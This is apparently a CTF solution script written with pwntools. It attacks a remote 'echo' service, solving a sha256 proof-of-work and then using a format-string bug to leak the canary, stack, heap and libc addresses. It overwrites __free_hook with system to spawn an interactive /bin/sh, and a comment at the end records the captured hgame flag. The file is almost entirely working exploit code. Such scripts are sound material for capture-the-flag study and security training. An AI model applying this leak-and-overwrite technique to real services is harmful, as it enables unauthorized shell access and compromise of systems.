from pwn import *

remote_addr=['chuj.top',52319] # 23333 for ubuntu16, 23334 for 18, 23335 for 19
context.terminal = ["/bin/tmux", "sp","-h"]
context.log_level=True
io=remote(remote_addr[0],remote_addr[1])
elf_path = "./echo"
# io = process(elf_path)
local = False
libc = ELF("./libc-2.31.so")
# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf = ELF(elf_path)

#gdb.attach(p, 'c')


l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\x7f")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
lgs = lambda s			: log.info('\033[1;31;40m %s --> %s \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, '\x00'))
uu64 = lambda data		: u64(data.ljust(8, '\x00'))
ur64 = lambda data		: u64(data.rjust(8, '\x00'))


def lg(s,addr = None):
    if addr:
        print('\033[1;31;40m[+]  %-15s  --> 0x%8x\033[0m'%(s,addr))
    else:
        print('\033[1;32;40m[-]  %-20s \033[0m'%(s))

def raddr(a=6):
    if(a==6):
        return u64(rv(a).ljust(8,'\x00'))
    else:
        return u64(rl().strip('\n').ljust(8,'\x00'))



if local == False:
    ru('sha256(????) == ')
    sha256 = rn(64)
    lgs('sha256')
    import hashlib
    tmpstr = ''
    flag = False
    for i in range(48,127):
        for j in range(48,127):
            for k in range(48,127):
                for n in range(48,127):
                    tmpstr = chr(i)+chr(j)+chr(k)+chr(n)
                    hash=hashlib.sha256()
                    hash.update(bytes(tmpstr))
                    s = hash.hexdigest()
                    if s == sha256:
                        print(tmpstr)
                        flag = True
                        break
                if flag == True:
                    break
            if flag == True:
                break
        if flag == True:
            break


    sa('your ????> ',tmpstr)
def fmt(data,offset):
    pay = "%"+str(data)+"s%"+str(offset)+"$hn\x00"
    sla('>> ',str(256))
    sn(pay)

def fmt1(data,offset):
    pay = "%"+str(data)+"s%"+str(offset)+"$hhn\x00"
    sla('>> ',str(256))
    sn(pay)

sla('>> ',str(256))
sl('%8$p##%9$p#%10$p@%13$p*%11$p*%15$s')
heapbase = int(ru('##'),16) 
lg('heapbase',heapbase)
canary = int(ru('#'),16)
lg('canary',canary)
rbp = int(ru('@'),16) 
lg('rbp',rbp)
printret = rbp - 0x38 
lg('printret',printret)
libcbase = int(ru('*'),16)-libc.symbols['__libc_start_main']-243
lg('libcbase',libcbase)
system = libcbase + libc.symbols['system']
lg('system',system)
binsh = libcbase + libc.search('/bin/sh').next()
lg('binsh',binsh)
freehook = libcbase + libc.symbols['__free_hook']
lg('freehook',freehook)
stdin = libcbase + libc.symbols['_IO_2_1_stdin_']
lg('stdin',stdin)
io_buf_base = stdin + 8*7
lg('io_buf_base',io_buf_base)
mallochook = libcbase + libc.symbols['__malloc_hook']
lg('mallochook',mallochook)
pro = int(ru('*'),16)-0x12c2
lg('pro',pro)
stack = rbp + 8 
fmt1((stack+2)&0xff,6)
fmt((freehook>>16)&0xffff,10)
fmt1(stack&0xff,6)
fmt((freehook)&0xffff,10)

fmt((system)&0xffff,13)
fmt((freehook+2)&0xffff,10)
fmt((system>>16)&0xffff,13)
fmt((freehook+4)&0xffff,10)
fmt((system>>32)&0xffff,13)
sla('>> ',str(256))
sl('/bin/sh\x00')
# dbg()
sla('>> ',str(0))

irt()

# hgame{I~H@TE_FMT-eXpLO!t:(~So~THErE_Will_BE~nO_MorE}